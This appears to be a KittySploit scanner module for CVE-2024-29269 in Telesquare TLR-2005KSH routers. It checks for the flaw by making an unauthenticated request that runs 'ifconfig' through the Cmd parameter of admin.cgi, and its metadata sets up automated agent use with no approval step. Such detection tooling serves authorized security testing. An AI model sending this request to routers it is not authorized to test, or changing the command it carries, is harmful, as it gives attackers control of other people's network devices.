#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""Telesquare Tlr-2005Ksh is a Sk Telecom Lte router from South Korea's Telesquare company."""

from kittysploit import *
from lib.protocols.http.http_client import Http_client


class Module(Scanner, Http_client):
    __info__ = {
        'name': 'Telesquare TLR-2005KSH - Remote Command Execution Detection',
        'description': "Telesquare Tlr-2005Ksh is a Sk Telecom Lte router from South Korea's Telesquare company.Telesquare TLR-2005Ksh versions 1.0.0 and 1.1.4 have an unauthorized remote command execution vulnerability. An attacker can exploit this vulnerability to execute system commands without authorization through the Cmd parameter and obtain server permissions.",
        'author': ['KittySploit Team'],
        'severity': 'critical',
        'tags': ['web', 'scanner', 'cve', 'cve2024', 'telesquare', 'tlr', 'rce', 'vkev', 'vuln'],
        'agent': {
            'risk': 'active',
            'effects': ['network_probe'],
            'expected_requests': 1,
            'reversible': True,
            'approval_required': False,
            'produces': ['tech_hints', 'risk_signals', 'endpoints'],
            'cost': 1.0,
            'noise': 0.4,
            'value': 1.0,
            'requires': {
                'min_endpoints': 0,
                'min_params': 0,
                'tech_hints_any': [],
                'tech_hints_all': [],
                'specializations_any': [],
                'risk_signals_any': [],
                'auth_session': False,
                'capabilities_any': [],
                'capabilities_all': [],
                'confidence_min': {},
                'confidence_min_any': {},
                'endpoint_pattern_any': [],
                'param_any': [],
                'api_surface_ready': False,
            },
            'chain': {
                'produces_capabilities': [
                    {
                        'capability': 'risk_signal',
                        'from_detail': '',
                    },
                ],
                'consumes_capabilities': [],
                'option_bindings': {},
                'suggested_followups': [],
            },
        },
        'references': [
            'https://github.com/wutalent/CVE-2024-29269/blob/main/index.md',
            'https://gist.github.com/win3zz/c26047ae4b182c3619509d537b808d2b',
            'https://github.com/Ostorlab/KEV',
            'https://github.com/YongYe-Security/CVE-2024-29269',
            'https://github.com/nomi-sec/PoC-in-GitHub',
        ],
        'cve': 'CVE-2024-29269',
    }

    def run(self):
        path = '/cgi-bin/admin.cgi?Command=sysCommand&Cmd=ifconfig'
        r = self.http_request(method='GET', path=path, allow_redirects=False)
        if not r or r.status_code != 200:
            return False
        body = r.text or ""
        headers = "\n".join(f"{k}: {v}" for k, v in r.headers.items())
        body_all = ('<CmdResult>', '</xml>', 'Ethernet', 'inet',)
        header_any = ('text/xml',)
        if (all(m in body for m in body_all)) and (any(m in headers for m in header_any)):
            self.set_info(severity='critical', reason='Telesquare TLR-2005KSH - Remote Command Execution detected', path=path)
            return True
        return False

